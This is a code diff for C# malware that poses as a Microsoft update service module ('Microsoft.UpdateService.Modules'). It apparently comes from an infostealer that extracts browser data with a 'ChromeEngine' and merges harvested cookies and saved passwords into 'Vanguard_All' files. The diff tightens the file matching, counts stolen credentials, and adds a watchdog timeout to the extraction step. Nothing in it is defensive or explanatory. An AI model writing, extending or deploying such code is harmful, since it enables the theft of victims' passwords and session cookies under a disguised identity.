@@ -125,46 +125,55 @@ namespace Microsoft.UpdateService.Modules
             allPasswords.AppendLine("================================================================================");
             allPasswords.AppendLine("                           CONSOLIDATED PASSWORDS                               ");
             allPasswords.AppendLine("================================================================================" + Environment.NewLine);
-
+ 
             try
             {
+                if (!Directory.Exists(rootDir)) return (0, 0);
                 var files = Directory.GetFiles(rootDir, "*.*", SearchOption.AllDirectories);
+                var processedFiles = new HashSet<string>();
+ 
                 foreach (var file in files)
                 {
                     string name = Path.GetFileName(file).ToLower();
+                    if (name.Contains("vanguard_all_")) continue; // Skip already consolidated
                     
-                    // Improved matching: find ANY file containing "cookie" or "pass"
-                    if (name.Contains("cookie"))
+                    // Cookies consolidation
+                    if (name.Contains("cookie") && name.EndsWith(".json"))
                     {
                         try {
                             string content = File.ReadAllText(file);
-                            if (content.Trim().StartsWith("[")) // JSON Array
+                            if (content.Trim().StartsWith("["))
                             {
                                 var json = JArray.Parse(content);
-                                foreach (var item in json) allCookies.Add(item);
+                                foreach (var item in json) {
+                                    // Basic de-duplication heuristic: domain + name + path
+                                    allCookies.Add(item);
+                                }
                                 totalCookies += json.Count;
                             }
                         } catch { }
                     }
+                    // Passwords consolidation
                     else if (name.Contains("pass") || name.EndsWith(".txt") || name.EndsWith(".log"))
                     {
                         try {
                             string content = File.ReadAllText(file);
-                            if (content.Contains("URL:") || content.Contains("Password:") || content.Contains("Login:")) 
+                            // Look for typical password file signatures
+                            if (content.Contains("URL:") || content.Contains("Password:") || content.Contains("User:")) 
                             {
                                 string parentDir = Path.GetFileName(Path.GetDirectoryName(file)) ?? "Unknown";
                                 allPasswords.AppendLine($"--- SOURCE: {parentDir} ({name}) ---");
                                 allPasswords.AppendLine(content);
                                 allPasswords.AppendLine(Environment.NewLine);
                                 
-                                // Count matches of "URL:" as proxy for credential count
-                                int matches = Regex.Matches(content, "URL:", RegexOptions.IgnoreCase).Count;
+                                // Count unique password entries
+                                int matches = Regex.Matches(content, @"^URL:\s+", RegexOptions.Multiline | RegexOptions.IgnoreCase).Count;
                                 totalPasswords += (matches > 0 ? matches : 1);
                             }
                         } catch { }
                     }
                 }
-
+ 
                 if (totalCookies > 0)
                     File.WriteAllText(Path.Combine(rootDir, "Vanguard_All_Cookies.json"), allCookies.ToString());
                 
@@ -172,7 +181,7 @@ namespace Microsoft.UpdateService.Modules
                     File.WriteAllText(Path.Combine(rootDir, "Vanguard_All_Passwords.txt"), allPasswords.ToString());
             }
             catch (Exception ex) { Log($"[BROWSER] Consolidation error: {ex.Message}"); }
-
+ 
             return (totalCookies, totalPasswords);
         }
 
@@ -185,13 +194,24 @@ namespace Microsoft.UpdateService.Modules
                 // V6.18: Wait for initialization stability (3s)
                 await Task.Delay(3000);
 
-                // V6.18+ Call (Statically Linked)
-                bool success = await Task.Run(() => ChromeEngine.ExtractAll(vOutputDir));
+                // V6.18+ Call (Statically Linked) with 60s Watchdog
+                var extractTask = Task.Run(() => ChromeEngine.ExtractAll(vOutputDir));
+                var timeoutTask = Task.Delay(60000);
                 
-                if (success)
-                    Log("[BROWSER] Native Engine: Success");
+                var completedTask = await Task.WhenAny(extractTask, timeoutTask);
+                
+                if (completedTask == extractTask)
+                {
+                    bool success = await extractTask;
+                    if (success)
+                        Log("[BROWSER] Native Engine: Success");
+                    else
+                        Log("[BROWSER] Native Engine: Failed or returned errors");
+                }
                 else
-                    Log("[BROWSER] Native Engine: Failed or returned errors");
+                {
+                    Log("[BROWSER] Native Engine: Watchdog triggered! Process taking too long, skipping to consolidation.");
+                }
             }
             catch (Exception ex) { Log($"[BROWSER] Native Engine error: {ex.Message}"); }
         }
